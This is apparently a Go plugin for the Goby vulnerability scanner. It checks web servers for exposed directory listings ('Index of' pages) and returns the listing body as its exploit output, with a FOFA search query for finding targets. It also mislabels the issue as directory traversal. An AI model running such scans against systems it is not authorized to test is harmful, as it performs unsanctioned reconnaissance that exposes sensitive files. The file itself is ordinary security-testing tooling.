package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HTTP Server index of directory traversal vulnerability",
    "Description": "<p>When a website has directory browsing enabled, it allows viewers to directly browse and view the website's directory structure and file content within the directory. This feature can provide a convenient way to explore and access files on the website.</p><p>Security vulnerabilities caused by improper server configuration. If the server does not set default index files or manually enables directory browsing, attackers can use this vulnerability to obtain a complete list of directories on the server and potentially access sensitive files such as backup files, database files, source code, etc. In this case, attackers can exploit directory browsing vulnerabilities to leak a large amount of sensitive information.</p>",
    "Product": "APACHE-HTTP_Server",
    "Homepage": "https://www.apache.org/",
    "DisclosureDate": "2018-01-01",
    "PostTime": "2024-02-01",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"Directory listing for\" || body=\"Index of\" || protocol=\"http\" || protocol=\"https\"",
    "GobyQuery": "body=\"Directory listing for\" || body=\"Index of\" || protocol=\"http\" || protocol=\"https\"",
    "Level": "2",
    "Impact": "<p>Security vulnerabilities caused by improper server configuration. If the server does not set default index files or manually enables directory browsing, attackers can use this vulnerability to obtain a complete list of directories on the server and potentially access sensitive files such as backup files, database files, source code, etc. In this case, attackers can exploit directory browsing vulnerabilities to leak a large amount of sensitive information.</p>",
    "Recommendation": "<p>1. Remove the file directory indexing function of the middleware by modifying the configuration file.</p><p>2. Set access permissions for file directories.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "HTTP Server Index of 目录遍历漏洞",
            "Product": "APACHE-HTTP_Server",
            "Description": "<p>当网站开启目录浏览功能时，它允许浏览者直接浏览和查看网站的目录结构以及目录中的文件内容。这样的功能可以提供一种方便的方式来探索和访问网站上的文件。</p><p>由于服务器配置不当引起的安全漏洞如果服务器没有设置默认索引文件或手动启用了目录浏览功能，攻击者就能够通过该漏洞获得服务器上目录的完整列表，并有可能访问到敏感文件，如备份文件、数据库文件、源代码等。这种情况下，攻击者可以利用目录浏览漏洞泄露大量敏感信息。</p>",
            "Recommendation": "<p>1、通过修改配置文件，去除中间件的文件目录索引功能。</p><p>2、设置文件目录的访问权限。</p>",
            "Impact": "<p>由于服务器配置不当引起的安全漏洞如果服务器没有设置默认索引文件或手动启用了目录浏览功能，攻击者就能够通过该漏洞获得服务器上目录的完整列表，并有可能访问到敏感文件，如备份文件、数据库文件、源代码等。这种情况下，攻击者可以利用目录浏览漏洞泄露大量敏感信息。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "HTTP Server index of directory traversal vulnerability",
            "Product": "APACHE-HTTP_Server",
            "Description": "<p>When a website has directory browsing enabled, it allows viewers to directly browse and view the website's directory structure and file content within the directory. This feature can provide a convenient way to explore and access files on the website.</p><p>Security vulnerabilities caused by improper server configuration. If the server does not set default index files or manually enables directory browsing, attackers can use this vulnerability to obtain a complete list of directories on the server and potentially access sensitive files such as backup files, database files, source code, etc. In this case, attackers can exploit directory browsing vulnerabilities to leak a large amount of sensitive information.</p>",
            "Recommendation": "<p>1. Remove the file directory indexing function of the middleware by modifying the configuration file.</p><p>2. Set access permissions for file directories.</p>",
            "Impact": "<p>Security vulnerabilities caused by improper server configuration. If the server does not set default index files or manually enables directory browsing, attackers can use this vulnerability to obtain a complete list of directories on the server and potentially access sensitive files such as backup files, database files, source code, etc. In this case, attackers can exploit directory browsing vulnerabilities to leak a large amount of sensitive information.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10899"
}`

	vulnerabilityCheckFlagDa7831qW := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uris := []string{`/`, `/node`}
		for _, uri := range uris {
			checkRequestConfig := httpclient.NewGetRequestConfig(uri)
			checkRequestConfig.VerifyTls = false
			checkRequestConfig.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(hostInfo, checkRequestConfig); resp != nil && resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "NodeManager") || strings.Contains(resp.RawBody, `<title>Directory listing for`) || ((strings.Contains(resp.Utf8Html, "<title>Index of ") || strings.Contains(resp.Utf8Html, "<title>Files...</title>") || strings.Contains(resp.Utf8Html, "<title>Directory Listing:")) && (strings.Contains(resp.Utf8Html, "<h1>Index of") || strings.Contains(resp.Utf8Html, "<h2>Index of") || strings.Contains(resp.Utf8Html, "<h3>Index of") || strings.Contains(resp.Utf8Html, `<h1>Index of:`)))) {
				return resp, nil
			} else if err != nil {
				return nil, err
			}
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := vulnerabilityCheckFlagDa7831qW(hostInfo)
			success := resp != nil && err == nil
			if success {
				stepLogs.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if resp, err := vulnerabilityCheckFlagDa7831qW(expResult.HostInfo); resp != nil && err == nil {
				expResult.Output = resp.RawBody
				expResult.Success = true
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = "漏洞利用失败"
			}
			return expResult
		},
	))
}
